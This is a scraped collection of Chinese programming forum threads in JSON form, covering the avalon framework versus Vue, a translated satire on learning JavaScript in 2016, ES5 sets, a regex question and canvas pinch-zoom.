{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://segmentfault.com/a/1190000007528383\" rel=\"nofollow\">avalon2.2 发布</a></p>\n<p>看这篇的介绍，感觉还真是前瞻后顾，兼容 IE6 ，然后还应用了 Proxy （不过这是什么？）。</p>\n<p>有同学用过么？如何？</p>\n</div></div>"], "reply": "41", "tittle": "今天逛 segment 发现另一个国人 MVVC 框架， avalon，有同学用过么？如何？", "comment": ["avalon 的亮点之一就是兼容 IE6 ……", " = . = IE6 浏览器，听话很😨呢。", "正美花了很多的心血在上面，有看过它的源码，很多地方能看出认真打磨的痕迹，只是，生不逢时\r", "前端开发也许也进入了快餐节奏，大公司背景，作者的名气，如何推广自己\r", "当然，从另一个角度来讲，现在的 mvvm 都是想让开发者用更简单的方法来完成更复杂的任务的，每个 mvvm 框架都有自己主打的场景\r", "不如看看 avalon 的源码，也许可以学到很多东西、", " 嗯，感觉是的呢。感觉 Vue 都有一个团队在专门推广了。", "看到兼容 IE6 就不想用了", " 被尤大看到会被手撕的（逃", " 噫。\r", " 😂它好像还提供不兼容 IE6 的 modern 版本。", "铺天盖地的 vue ，魔幻的是，文档是从英文翻译过来的", " 用什么语言写文档不是作者的意愿吗，对于一个受益者来说，我觉得没必要要求什么吧？并且英语的适用范围比中文大多了。", " 这太片面了，本身用意是极好的，你深入看下会发现真的挺不错的，我在用着", "楼上有些人能别这么 low 吗？爱用不用啊，捧这个贬那个。。。醉了", " \r", " \r", "并不是贬低 , 就个人而言 我看到 IE 低版本就想吐, 作为一个后端 我深恶痛绝 ie", " ie8 我都不想兼容，只兼容 chrome50 以上就行了", " \r", " \r", "\r", "其实没有带贬义的意思吧：\r", "1. Vue 的推广确实做的好呀。\r", "2. 文档也确实是从英文翻译过来的。\r", "3. “魔幻”更多表示一种惊奇之意吧", "r#9 @", " 当大家知道作者是国人的时候部分人表示惊奇", "顺丰蜂巢用了，官网服务站查询、和物流查询至今就没有正常过。\r", "\r", "其实我还是蛮推荐学习这个框架的。作者是极致性能狂、代码简单好懂、有中文注释。", "还不错得~~", " 你这样讲，尤大真的会撕了你哦\r", " 噢！谢谢提醒，是我言过了。", "正在用，源码我没读过，文档确实没有 vue 那么直观", "avalon 的亮点之一就是一线职业队", "我超佩服这个团队\r", "用 vb 实现了 ie6 的双向绑定\r", "就这一点已经足够逆天了", "今天你才发现···", "mvvc 是什么鬼？不应该是 mvvm 么？\r", "和 vue 相比，完全不是一个量级的", "利益相关，前 Qunar 员工， Avalon 作者就在 Qunar\r", "Qunar 大量前端项目采用 Avalon 进行开发，另外在 14-15 年的 Hybrid 项目中，使用的也是 Avalon ，后来转型 React Native\r", "如果不考虑 IE 的话，个人还是推荐用 Vue", " 你好，我想请教一下， vue 做推广是为了赚钱吗？怎么赚钱呢？既然是开源框架。", "很好用， ie6 、 7 必须兼容的页面你也能用多好？！", "  哈哈 , 你这想法非常危险啊 , 会让 vue 非常沮丧 ,#19 楼给了链接可以花个几分钟看看", " vue 每个月固定的社区捐赠至少就有 5000 美刀。", "没听能见到作者。司徒正美挺有资历的前端。", "没用过，但是看作者的态度十分好", " \r", "不赚钱啊，但是如果你正在使用 Vue 并且非常喜欢 Vue ，感觉它能够很好地提高你的工作效率，那么，你会希望它更好吧。\r", "\r", "加上一个简单的逻辑：如果能有更多的人参与进来，组件会丰富， issue 会变多，作者会更有动力， Vue 就越来越好用、方便了。\r", "\r", "那么，你会怎么做呢？", "正美大大已经成为过去了吗......", " 肯定有金钱做动力的，至于用户多了作者有动力，那只是一方面。 evanyou 现在全职做 vue ，也注册了一个 vue technology 。你比如说 nginx ，这是开源的，但也有 ", " 这个商业网站，人家成立公司了，为客户提供定制化解决方案。只是想不明白，一个前端框架怎么赚钱。\r", "\r", "声明：我 100%支持 vue 作者赚钱，大家都是成年了，总要考虑一家老小的口粮。", " 只是想不明白，一个前端框架怎么赚钱。很好奇。", "你们所说的这些框架我都没用过，不过很早就听说过了， avalon 作者可能由于自身水平原因，文档用中文，一开始就是面向国内开发者，而且据我观察，推崇者大多关注司徒正美，这些人大多有博客园账号。\r", "\r", "而 vue 一开始就是面向国际开发者的，我第一次听说这个框架都不知道是国人写的，后来在 Twitter 上看到有国外开发者这也推荐这个框架，说明确实有它的优点。至于楼上所说的 vue 的商业推广，我从来没看到过，从一开始到现在就是靠口碑传播的。", "造一个 mvvm 框架根本就没什么难度…\r", "\r", "主要是一个框架有了不错的生态以后就没必要自己再重新造一遍轮子。\r", "\r", "至于哪个轮子能有不错的生态呢？除了轮子本身的质量以外，运气和时机才是决定性因素…", "，，，，在，,,,.,", "如果把 API 设计也归到框架质量的讨论之中， Vue 基本没有敌手。", "api 设计感觉是没有 vue 优雅。\r", "文档写得也没有 vue 那么规范化、条理化。但是那个指令的一览进行了分类，这个点我觉得挺好的。\r", "作者没有尤大那种设计背景，所以在 ui 层面也做得不够美观。\r", "示例等等写得也没有 vue 那么地规范。\r", "vue 给我的感觉是既有工程，又有艺术。\r", "avalon 则感觉只有工程。\r", "然而， avalon2 兼容到 ie7 这的确是一个优势，既可以前端渲染做 spa ，也可以做服务端渲染，可以应对 pc 端的多种应用场景。同时解决兼容性和 seo 的问题。\r", "vue.js 则只支持到 ie9+，服务端渲染解决 seo 的问题，但是很多 pc 的网站仍然需要兼容 ie8+。\r", "无论是实现上，还是其他软实力相关的问题上，这两者有很大的不同，但其实没有必要争执孰好孰坏。\r", "对于工程师而言，选择合适的技术栈应对面临的工程场景，就已经足够。\r", "对于框架的开发者而言，一个成熟的社区，理应能够互相学习，取长补短，不断取得进步，而不是互撕。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://hackernoon.com/how-it-feels-to-learn-javascript-in-2016-d3a717dd577f\" rel=\"nofollow\">原文</a></p>\n<p>译者：<a href=\"https://www.zhihu.com/people/zhihusucks\" rel=\"nofollow\">方应杭</a></p>\n<p>嘿，我最近接到一个 Web 项目，不过老实说，我这两年没怎么接触 Web 编程，听说 Web 技术已经发生了一些变化。听说你是这里对新技术最了解的 Web 开发工程师？</p>\n<blockquote>\n<p>准确地说，我是一名「前端工程师」。不过你算是找对人了。我对今年的技术别提多熟了，前端可视化、音乐播放器、能踢足球的无人机，你尽管问吧。我刚去 JS 大会和 React 大会逛了一圈，没有什么新技术是我不知道的。</p>\n</blockquote>\n<p>厉害。是这样的，我要开发一个网页，用来展示用户的最新动态。我想我应该通过后端接口获取数据，然后用一个 table 来展示数据，用户可以对数据进行排序。如果服务器上的数据变化了，我还需要更新这个 table 。我的思路是用 jQuery 来做。</p>\n<blockquote>\n<p>可别用 jQuery ！现在哪还有人用 jQuery 。现在是 2016 年了，你绝对应该用 React 。</p>\n</blockquote>\n<p>哦，好吧， React 是什么？</p>\n<blockquote>\n<p>React 是一个非常厉害的库， Facebook 的牛人写的。它能让页面更可控，性能极高，而且使用起来很简单。</p>\n</blockquote>\n<p>听起来确实不错。我能用 React 展示服务器传来的数据吗？</p>\n<blockquote>\n<p>当然可以，你只需要添加两个依赖，一个是 React ，一个是 React DOM</p>\n</blockquote>\n<p>额，等下，为什么是两个库？</p>\n<blockquote>\n<p>React 是我说的库， React DOM 是用来操作 DOM 的。因为这些 DOM 是用 JSX 写的，所以需要一个专门的库来操作。</p>\n</blockquote>\n<p>JSX ？ JSX 是什么？</p>\n<blockquote>\n<p>JSX 是对 JS 的扩展，它看起来跟 XML 差不多，可以用来写 HTML ，你可以认为 JSX 是一种更优雅的 HTML 写法。</p>\n</blockquote>\n<p>为什么不用 HTML 了……？</p>\n<blockquote>\n<p>现在可是 2016 年啊，没有直接写 HTML 的。</p>\n</blockquote>\n<p>对哦。好吧，加了这两个依赖，是不是就可以开始用 React 了？</p>\n<blockquote>\n<p>不行哦。你需要添加 Babel ，然后才能用 React 。</p>\n</blockquote>\n<p>Babel 是另一个库？</p>\n<blockquote>\n<p>嗯， Babel 是一个转译工具， Babel 能把你写的 JS 转译成任意版本的 JS 。你不一定非要用 Babel ，但是如果你不用的话，你就只能写 ES5 的语法了。你知道的，现在是 2016 年，你怎么能不使用 ES2016+ 的语法呢？ ES2016+ 多么酷啊。</p>\n</blockquote>\n<p>ES5 是啥？ ES2016+ 又是啥？我有点晕。</p>\n<blockquote>\n<p>ES5 就是 ECMAScript 5 。大部分人都会使用 ES5 ，因为大部分浏览器都支持 ES5 。</p>\n</blockquote>\n<p>ECMAScript 是啥……</p>\n<blockquote>\n<p>你晓得的， JS 是 1995 年诞生的，而 JS 的标准是 1999 制定出来的。那时候 JavaScript 还叫做 Livescript ，只能运行在网景的浏览器里。那时真是混乱的年代，现在好了，我们有了 JS 的 7 个版本的规范。</p>\n</blockquote>\n<p>7 个版本？那 ES5 和 ES2016+ 是？</p>\n<blockquote>\n<p>分别是第 5 个版本和第 7 个版本。</p>\n</blockquote>\n<p>诶，那第六个版本呢？</p>\n<blockquote>\n<p>你说的是 ES6 。每个版本都是上一个版本的超集，所以你直接使用最新的 ES2016+ 就好了。</p>\n</blockquote>\n<p>对哦。为什么不用 ES6 呢？</p>\n<blockquote>\n<p>好吧，你可以用 ES6 ，但是你就用不到 async 和 await 这么酷的语法了。用 ES2016+ 比较好。用 ES6 的话你就只能用 generator 来控制异步任务流了。</p>\n</blockquote>\n<p>不知道你在说什么……你说了太多我听不懂的名词了。我只是想从服务器取点数据，我以前用 jQuery 挺好的，从 CDN 引入 jQuery ，我就能用 AJAX 获取数据了，现在不能这样做吗？</p>\n<blockquote>\n<p>大哥，都 2016 年了，没人用 jQuery 好吗。所有人都知道用 jQuery 只会造出「意大利面条」一样的代码（不可维护）</p>\n</blockquote>\n<p>好吧，所以我现在要加载三个库才能获取并展示数据。</p>\n<blockquote>\n<p>对的，其实你可以用「模块管理器」把这三个库「打包」成一个文件。</p>\n</blockquote>\n<p>哦，什么是模块管理器……</p>\n<blockquote>\n<p>不同平台的模块管理器不同啦。前端的模块管理器一般指管理 AMD 或者 CommonJS 模块的东西。</p>\n</blockquote>\n<p>好……吧，什么是 AMD 和 CommonJS ？</p>\n<blockquote>\n<p>是两个定义。我们有很多方式来描述 JS 中多个库或类的交互方式，比如 exports 和 requires 。你可以按照 AMD 或者 CommonJS 的 API 来书写 JS ，然后用 Browserify 将它们打包。</p>\n</blockquote>\n<p>听起来很有道理。不过，什么是 Browserify ？</p>\n<blockquote>\n<p>是一个工具，用来将 CommonJS 形式的 JS 文件打包起来，放到浏览器里运行。用 npm 仓库的人发明了 CommonJS 。</p>\n</blockquote>\n<p>npm 仓库是什么……</p>\n<blockquote>\n<p>是一个公开的仓库，用于放置可依赖的模块。</p>\n</blockquote>\n<p>就像一个 CDN 么？</p>\n<blockquote>\n<p>不太一样。它更像是一个数据库，每个人都能在上面发布代码，也能下载上面的代码。你可以在开发的时候将这些代码下载到本地来使用，必要的时候也能上传到 CDN 。</p>\n</blockquote>\n<p>听起来像是 Bower ！</p>\n<blockquote>\n<p>是的，不过现在是 2016 年了，没有人用 Bower 了……</p>\n</blockquote>\n<p>好吧，我知道了，所以我应该用 npm 来安装依赖。</p>\n<blockquote>\n<p>对的。我举个例子吧，如果你要使用 React ，你直接用 npm 安装 React ，然后在代码里导入 React 就可以了。大部分 JS 库都能这么安装。</p>\n</blockquote>\n<p>嗯， Angular 也可以。</p>\n<blockquote>\n<p>Angular 是 2015 年的事情了。不过今年 Angular 还没死，还有 VueJS 和 RxJS 等等，你想学一学么？</p>\n</blockquote>\n<p>还是用 React 吧。我刚才已经学了够多东西了。所以我用 npm 安装 React 然后用 Browerify 来打包就好了？</p>\n<blockquote>\n<p>是的。</p>\n</blockquote>\n<p>这么做看起来有点过于复杂啊。</p>\n<blockquote>\n<p>确实。这就是为什么你应该使用 Grunt 、 Gulp 或者 Broccoli 这样的任务管理工具，它们能自动运行 Browserify 。不对，你现在可以用 Mimosa 。</p>\n</blockquote>\n<p>你在说什么……</p>\n<blockquote>\n<p>任务管理工具。不过我们现在已经不用了。去年我们还在用，后来改成了 Makefiles ，但是现在我们用的都是 Webpack 。</p>\n</blockquote>\n<p>我以为只有 C/C++ 项目才会用 Makefiles 。</p>\n<blockquote>\n<p>是的，不过显然我们做 Web 开发的，喜欢先把事情搞复杂，然后回归到最朴素的状态。每年我们都是这么搞的。你就看着吧，过不了两年，我们就可以在网页上写汇编了。</p>\n</blockquote>\n<p>唉，你刚才说的 Webpack 是什么？</p>\n<blockquote>\n<p>另一种模块管理工具，同时也是一个任务管理工具。你可以认为它是 Browserify 的加强版。</p>\n</blockquote>\n<p>哦，好吧，为什么 Webpack 是加强版？</p>\n<blockquote>\n<p>额，可能并没有加强吧。 Webpack 告诉你应该如何管理你的依赖， Webpack 允许你使用不同的模块管理器，不只是 CommonJS ，甚至支持 ES6 模块。</p>\n</blockquote>\n<p>这都是哪跟哪啊，我都被绕晕了。</p>\n<blockquote>\n<p>大家都被绕晕了，不过等 SystemJS 出来了就好了。</p>\n</blockquote>\n<p>天呐，又一个 JS 库，这是什么鬼？</p>\n<blockquote>\n<p>呵呵，不像 Browserify 和 Webpack 1.x ， SystemJS 是一个动态的模块加载器。</p>\n</blockquote>\n<p>等下，刚才不是说应该把所有依赖打包成一个文件吗？</p>\n<blockquote>\n<p>话是这么说，但是等 HTTP/2 普及之后，不打包反而更好。</p>\n</blockquote>\n<p>那为什么我们不直接在页面里添加 React 的三个依赖文件呢？</p>\n<blockquote>\n<p>不行。你可以从 CDN 加载这些文件，但是你还是要在本地用 Babel 转译。</p>\n</blockquote>\n<p>唉，这么鹾？</p>\n<blockquote>\n<p>是的，你不能在生产环境上运行 babel ，你应该在发布到生产环境之前，运行一系列的任务，包括压缩、混淆、内联化 CSS 、延迟加载 script ……</p>\n</blockquote>\n<p>我懂了我懂了。既然我不能直接用 CDN ，那么我应该怎么做？</p>\n<blockquote>\n<p>我会考虑用 Webpack + SystemJS + Babel 来转译 Typescript 。</p>\n</blockquote>\n<p>Typescript ？我们不是在说 JavaScript 吗？！</p>\n<blockquote>\n<p>Typescript 也是 JavaScript 呀，它比 JS 更好用，是 JS 的超集，它是基于 ES6 的，就是我们刚才谈论的 ES6 ，你还记得吧。</p>\n</blockquote>\n<p>ES2016+ 已经是 ES6 的超集了，怎么又冒出来一个 Typescript ？</p>\n<blockquote>\n<p>是这样的， Typescript 能让我们写出「强类型」的 JS ，从而减少运行时的错误。 2016 年，我们应该让 JS 支持强类型了。</p>\n</blockquote>\n<p>显然 Typescript 可以做到。</p>\n<blockquote>\n<p>Flow 也可以做到，区别是 Typescript 需要编译，而 Flow 只是检查语法。</p>\n</blockquote>\n<p>唉， Flow 是？</p>\n<blockquote>\n<p>是一个静态类型检查器，就是 Facebook 的人写的。使用 OCaml 写的，函数式编程很叼的。</p>\n</blockquote>\n<p>OCaml ？函数式编程？</p>\n<blockquote>\n<p>如今大牛都用这些东西，都 2016 年了，你懂的，函数式编程、高阶函数、柯里化、纯函数这些概念。</p>\n</blockquote>\n<p>不知道你在说什么。</p>\n<blockquote>\n<p>一开始大家都不知道。这么说吧，你只需要知道函数式编程比面向对象编程厉害， 2016 年我们就指着函数式编程了。</p>\n</blockquote>\n<p>等下，我大学里学过面向对象编程，当时我觉得它还不错。</p>\n<blockquote>\n<p>Java 在被 Oracle 买下来之前也挺不错啊。我的意思是，面向对象以前是不错，现在依然有人用它，但是现在所有人都发觉状态变换是很难维护的，所以大家都开始用「不可变对象」和函数式编程了。 Haskell 的人已经用这套东西用了很久了，不过幸运的是 Web 开发领域里有 Ramda 这样的库，让我们用 JS 就可以进行函数式编程了。</p>\n</blockquote>\n<p>你刚刚是不是又抛出了几个名词？ Ramnda 又是什么？</p>\n<blockquote>\n<p>不是 Ramnda ，是 Ramda ，跟 Lambda 表达式有点像。是 David Chambers 写的库。</p>\n</blockquote>\n<p>谁？</p>\n<blockquote>\n<p>David Chambers ，大神一个。 blablabla</p>\n</blockquote>\n<p>我不得不打断你一下了。这些东西看起来都不错，但是我觉得它们都太复杂，而且没必要。我只是想获取数据然后展示，我很确定这种情况下我不需要掌握这些知识。</p>\n<p>回到 React 吧，用 React 我怎么从服务器获取数据？</p>\n<blockquote>\n<p>额， React 没有提供这个功能，你只能用 React 展示数据。</p>\n</blockquote>\n<p>服了啊。那我怎么获取数据？</p>\n<blockquote>\n<p>你用 Fetch API 就可以了。</p>\n</blockquote>\n<p>啥玩意？这个 API 的名字很烂啊。</p>\n<blockquote>\n<p>我也觉得是啊。 Fetch API 是浏览器提供的异步请求接口。</p>\n</blockquote>\n<p>哦，那不就是 AJAX 。</p>\n<blockquote>\n<p>AJAX 只是使用 XMLHttpRequest 对象，但是 Fetch API 可以让你用 Promise 风格来发起异步请求，帮你摆脱「回调地狱」。</p>\n</blockquote>\n<p>回调地狱？</p>\n<blockquote>\n<p>是的，每次你发起一个异步请求，就得等待它响应。这时你就得在函数里使用一个函数，这种嵌套调用就是回调地狱。</p>\n</blockquote>\n<p>好吧。 Promise 解决了这个问题么？</p>\n<blockquote>\n<p>是的。用 Promise 来管理回调，你就可以写出更易读的代码，更容易测试的代码。甚至可以同时发起多个请求，然后等待它们全部返回。</p>\n</blockquote>\n<p>Fetch 也能做到吗？</p>\n<blockquote>\n<p>是的。但前提是你的用户使用了新版的浏览器，不然的话你就需要加一个 Fetch 的 「 polyfill 」，或者使用 Request 、 Bluebird 或者 Axios 这些库。</p>\n</blockquote>\n<p>天呐我到底需要多少个库？</p>\n<blockquote>\n<p>这是 JS ，同一件事情有上千个库在做。我们了解库，而且我们有最好的库，我们有海量的库，要什么有什么。</p>\n</blockquote>\n<p>你刚才说的几个库都是干什么的？</p>\n<blockquote>\n<p>这几个库操作 XMLHttpRequest 然后返回 Promise 对象。</p>\n</blockquote>\n<p>好像 jQuery 的 ajax 方法做的是同样的事吧……</p>\n<blockquote>\n<p>从 2016 年起我们就不用 jQuery 了。用 Fetch ，大不了加个 Polyfill ，要不然用 Bluebird 、 Request 或者 Axios 都行。然后用 await 和 async 管理 Promise ，这样才能控制好异步任务。</p>\n</blockquote>\n<p>这是你第三次说 await 了，那是什么东西？</p>\n<blockquote>\n<p>await 能让你拦住一个异步调用，让你更好地控制异步返回的数据，大大增强了代码的可读性。 await 非常好用，你只需要在 Babel 里添加 stage-3 配置，或者添加 syntax-async-functions 和 transform-async-to-generator 插件就可以了。</p>\n</blockquote>\n<p>听起来像是疯了。</p>\n<blockquote>\n<p>没疯。为了使用 await ，把 Typescript 编译之后再用 Babel 转译一道的人才是疯了。</p>\n</blockquote>\n<p>啥玩意？ Typescript 不支持 await ？</p>\n<blockquote>\n<p>下个版本就支持了。</p>\n</blockquote>\n<p>我已经无话可说了。</p>\n<blockquote>\n<p>你看其实很简单。用 Typescript 写代码，用 Fetch 发起异步请求，所有代码编译成 ES6 ，然后用上 Babel 的 stage-3 配置项，把 ES6 转译成 ES5 。所有代码用 SystemJS 加载。如果你用不了 Fetch ，就加个 polyfill ，或者用 Bluebird 、 Request 或者 Axios ，这样你就可以用 await 来处理 Promise 了。</p>\n</blockquote>\n<p>看了我们对于「简单」的理解是不同的。好吧，有了这些，我终于可以获取数据然后用 React 展示数据了，对吧？</p>\n<blockquote>\n<p>你的网页需要处理状态变更吗？</p>\n</blockquote>\n<p>唔，不用吧。我只是想展示数据。</p>\n<blockquote>\n<p>那就好，不然我就得跟你解释 Flux ，以及 Flux 的一些实现，比如 Flummox 、 Alt 、 Fluxible 。不过说真的你应该用 Redux 。</p>\n</blockquote>\n<p>你说的这些我就当耳旁风了。再说一次，我只想展示数据。</p>\n<blockquote>\n<p>这样啊，如果你只是想展示数据，其实你不需要 React 。你只需要一个模板引擎。</p>\n</blockquote>\n<p>你逗我呢？</p>\n<blockquote>\n<p>我只是告诉你你可以用什么技术。</p>\n</blockquote>\n<p>别说了，真的。</p>\n<blockquote>\n<p>我想说，即使只是用一个模板引擎，我还是会用 Typescript + SystemJS + Babel 的。</p>\n</blockquote>\n<p>我只是想在页面上展示数据，你就告诉我用哪个模板引擎就好了。</p>\n<blockquote>\n<p>有很多，你用过哪一个？</p>\n</blockquote>\n<p>额，太久没用了，不记得了。</p>\n<blockquote>\n<p>jTemplates 、 jQote 还是 PURE ？</p>\n</blockquote>\n<p>额，不记得，还有别的么？</p>\n<blockquote>\n<p>Transparency? JSRender? MarkupJS? KnockoutJS? 这一个支持双向绑定。</p>\n</blockquote>\n<p>还有吗？</p>\n<blockquote>\n<p>PlatesJS? jQuery-tmpl? Handlebars? 还有些人在用。</p>\n</blockquote>\n<p>有点像。有哪些跟最后一个比较像的？</p>\n<blockquote>\n<p>Mustache, underscore? 我记得连 Lodash 都有一个模板引擎，不过这是 2014 年的事情了。</p>\n</blockquote>\n<p>额，也许是再新一点的库？</p>\n<blockquote>\n<p>Jade? DustJS?</p>\n</blockquote>\n<p>没用过</p>\n<blockquote>\n<p>DotJS? EJS?</p>\n</blockquote>\n<p>没用过。</p>\n<blockquote>\n<p>Nunjucks? ECT?</p>\n</blockquote>\n<p>没用过。记不起来了，要是你的话，你用哪个？</p>\n<blockquote>\n<p>我应该会用 ES6 原生的模板字符串</p>\n</blockquote>\n<p>我猜猜，只有 ES6 支持。</p>\n<blockquote>\n<p>对的。</p>\n</blockquote>\n<p>需要用 Babel</p>\n<blockquote>\n<p>对的。</p>\n</blockquote>\n<p>需要用 npm 安装</p>\n<blockquote>\n<p>对的。</p>\n</blockquote>\n<p>需要用 Browserify 或者 Webpack ，或者 SystemJS</p>\n<blockquote>\n<p>对的。</p>\n</blockquote>\n<p>如果没用 Webpack 的话，我还需要一个任务管理工具。</p>\n<blockquote>\n<p>对的。</p>\n</blockquote>\n<p>但是由于我要用函数式编程和强类型语言，所以我首先要用上 Typescript 或者 Flow 。</p>\n<blockquote>\n<p>对的。</p>\n</blockquote>\n<p>如果我要用 await ，那我就必须用 Babel 转译。</p>\n<blockquote>\n<p>对的。</p>\n</blockquote>\n<p>然后我就能用上 Fetch 、 Promise 和各种炫酷的东西。</p>\n<blockquote>\n<p>嗯，别忘了加上 Fetch 的 Polyfill ，因为 Safari 不支持 Fetch 。</p>\n</blockquote>\n<p>你猜怎么着，我们就聊到这吧。我不做了，我不做 Web 了，我也不想再碰 JS 了。</p>\n<blockquote>\n<p>没事，过不了几年，我们都会用 Elm 或者 WebAssembly 了。</p>\n</blockquote>\n<p>我要回后端去了，我受不这些变动、版本更新、编译和转译了， JS 社区如果觉得有人能跟上它的脚步，那这个社区就是疯了。</p>\n<blockquote>\n<p>我理解你。我建议你去 Python 社区。</p>\n</blockquote>\n<p>为什么？</p>\n<blockquote>\n<p>听说过 Python 3 吗？</p>\n</blockquote>\n<p><a href=\"https://hackernoon.com/how-it-feels-to-learn-javascript-in-2016-d3a717dd577f\" rel=\"nofollow\">原文</a></p>\n<p>译者：<a href=\"https://www.zhihu.com/people/zhihusucks\" rel=\"nofollow\">方应杭</a></p>\n</div></div>", "<div class=\"topic_content\">平时想跟我交流的话，可以加前端交流群： 392054247 ，加群暗号： 2016JS</div>"], "reply": "148", "tittle": "在 2016 年学 JavaScript 是一种什么样的体验？", "comment": [" 神回复  哈哈哈~~", "作为刚刚入门 JS 的表示我混乱了", "写的很好，赞", "写得很好，我选择死亡。", " 我和你一样 哈哈哈哈", "Jade 不是已经炸成 Pug 了么。。。", " 原文有说 Pug", "前端的乱都是其固有特征造成的。\r", "\r", "1 浏览器更新不及时，也不可能更新及时。\r", "\r", "2 浏览器 js 原生不支持模块，而模块是大型程序的重要组织手段。\r", "\r", "俗话说语言不足架构补，又是一个例子。", "最后还要黑一下我大 Python ！\r", "\r", "不过，黑的是真的好，觉得 JavaScript 现在已经和 C++一样是一个 monster 了，现在需要一本更新版本的 JavaScript: The Good Parts :P", "厉害👍", "这个段子深刻反映了前端近几年的乱象，我个人并不排斥任何新技术，但更倾向于实用性，如果 JS 社区的疯狂对最终产品开发有着极大的促进作用，那无可厚非。但很显然现在前端从业者参与的是一场对工具化滥用的狂热的追赶。   From ：在 2016 年学 JavaScript 是一种什么样的体验？", "追随技术的夺命狂奔", " ts 还是有正面意义的吧，其他不说，光一个 *.d.ts 就是很大的贡献吧", " 66666", "华科的学弟来参观一下", " 正面意义是有的，但是只是工具，最终代码好坏还是程序员基本功说了算\r", "我不是说了么 java c#都是强类型+宇宙级 IDE 配备 而且 java 还有大量的解决方案 也没看 j2ee 的程序多么好维护", "6 的一 P", "Algorithm + Data Structure, the core of Computer Science", "在 2016 年 10 月份的下半月 学 JavaScript 是一种什么样的体验？", "大声笑，笑出声~", "目前做前端的，感觉确实出来的东西太多了；后来想了想，我还是从头开始巩固基础把；\r", "现在都不继续看 vue ， angular ， react ， node 的知识了；\r", "现在打算把高程三和权威指南全部刷 2 遍，再刷基本不错的 Javascript （是的，全部都是原生）；\r", "然后再刷两边 jquery ，整理一下不错的 jquery 插件；\r", "然后再把 node 捡起来，再刷一下 react ，不打算搞 angular 了；\r", "\r", "目前在全面的总结整理原生 Javascript 知识，有感兴趣的可以看一下啊；\r", "\r", "已经放在 github 上；\r", "\r", "\r", "\r", "个人感觉，原生和 jquery 刷的好，以后入手别的肯定很快，不会被动的追风；", "写的是真 NB ，一个字‘服’", "我居然看完了。。。不过，总算熟悉这些新名词了，还好我只用 RN ，大部分问题都被 FB 解决了", "哈哈。我支持前端。尤其是 mvvm 之类的。之前会有说<?php ?>是 php 代码，应该后端写。现在好了。{{}}后端写好接口之后。前端自己折腾吧。", "加完群才发现，这居然是条广告。是群号是一个培训机构的。。。。。。\r", "套路深", " 发免费教程，不想要就不要加嘛", " 你说的是对的，但是就编码体验来说的话， TypeScript 的体验明显是好上很多的", " \r", "(1)ts 的语法不像 java ，不像 c ，也不像.net ，更不像 ecma5 ，也不像 php 、 python ，对于写惯老 js 的人看着很不习惯\r", "(2)考虑现在 sourcemap 支持仍然不完善（不要跟我说版本不一致啦，我 chrome 还经常断点起飞），尤其是在 ie 下调试，我能写 ecma5 还是 ecma5\r", "(3)let 这种东西，以及 class ，普遍还都是 pollyfill 运行，想想看你 let 用多了要编译出多少个闭包来。。因为只有函数才能创建作用域啊\r", "(4)我用 webstorm...", " 233 ，那就无解啦，你这边的问题我倒是没碰到几个\r", "1 、我先学的 c++ & .NET\r", "3 、我搞的玩具都是 node 下面的，直接开的 es6 ……\r", "2 、 4 、 Visual Studio Code ……", "2016 年，前端的夺权年。", "看的要哭了。血雨腥风的时代。\r", "以后前端也会出现几行“烫烫烫”了...", "新技术露头没有罪，关键是使用者要理性“追捧”，能抑制“乱”象~", "这绝对是事实", "措手不稽.jpg", "厉害了我的哥", " 哈哈 我也用的是 vscode ，不过现在 vscode 还是需要完善", "一入前端深似海", "只能说，这文章写的漂亮。感触越来越深以后，最近又看了一遍 c 和汇编，感觉丫的又有动力，啥都不怕了", " \"但是等 HTTP/2 普及之后，不打包反而更好 \"。打包成一个文件不是一直是服务端优化的一部分么， http2 做了什么了？", " HTTP/2 一个连接传多个文件，相当于自带打包。", " http/2 性能提升着实强大。 thx", "不写 js 这几年都发生了什么? 各路妖魔鬼怪", "看似用一整篇文章黑前端，黑 JS ，“是的，不过显然我们做 Web 开发的，喜欢先把事情搞复杂，然后回归到最朴素的状态。每年我们都是这么搞的。”\r", "但是为什么最后要强行黑一波 Python ？", " 感谢！", "赞！很好的入门文章，从入门到放弃。。。", "好吧，这很前端。。", "感觉楼主写的就是名词接龙，一个词被提起解释再提起另一个", "这篇文让我印象深刻。半年前我还是看的云里雾里的。现在应用到项目上，很多的东西都可以借鉴的。尤其是模块化，组件化部分，很受启发。现在我已经毫无压力理解文章内容了~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>就是元素不可重复，判断是否在集合中花费 logn 时间，的那个 Set</p>\n<p>找到了这个： <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set\" rel=\"nofollow\">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set</a>\n但是这个是 ES6</p>\n<p>github 上也找不到</p>\n</div></div>"], "reply": "4", "tittle": "ES5 中，想用集合，有什么好方法吗？", "comment": ["随便找个 es6 的 shim 用着就行了", "对象的 key 不就是集合吗", " 嗯。。找到一篇这个 ", " 就是用你说的方法"]},
{"content": "", "reply": "8", "tittle": "/\\x01#(\\d+)/g 能匹配什么样的字符串", "comment": ["以 0x01 打头的，跟一个#号的，后面一堆数字的字符串。\r", "0x01 是一个控制字符不是可显示字符。", "/\\x01#(\\d+)/g  你想匹配 html 中的 unicode 的数字？", "  我是看见 riot 的 compile 中有这样的一个正则，去匹配自定义 tag 中的属性", "难道 你们基础课里的 ACSII 的内容，你没有学过？？？", "   野生程序员", "\\x01 not printable, so '\\x01#123', '‘\\x01#1', ....?", "好像“#”号是注释吧", "具体问题具体分析了  vim JavaScript Perl Python 里面的正则表达式支持都不一样\r", "我只知道在 vim 里面\\x 匹配 16 进制数字\\d+匹配一个或多个数字其他内容匹配它本身"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，通过给 canvas 绑定了 touch 事件，计算出了缩放的比例以及两指之间的中心点。现在就是缩放的时候 canvas 的 y 和 y 坐标的取值问题。如何以触摸的那个点为原点(origin)进行缩小放大，我要怎么计算 x 和 y 的值。如果有 demo 的话那就更好了！</p>\n</div></div>"], "reply": "3", "tittle": "html5 canvas 如何实现双指触摸局部的缩小和放大", "comment": ["    一年前做的东西。 用过。 很急  一个星期 前端加后台 就一个人。 代码有点乱  主要 是用了 那个 facetouch.js  然后 具体的都是那个 app.js  里面的。  代码 很乱 很挫 误喷。", "腾讯有个手势库，叫 alloyfinger\r", "\r", "演示地址 ", " @", "   感谢，已经解决了。在 stackoverflow 上找到了答案，参考了他们的做法实现了， "]},
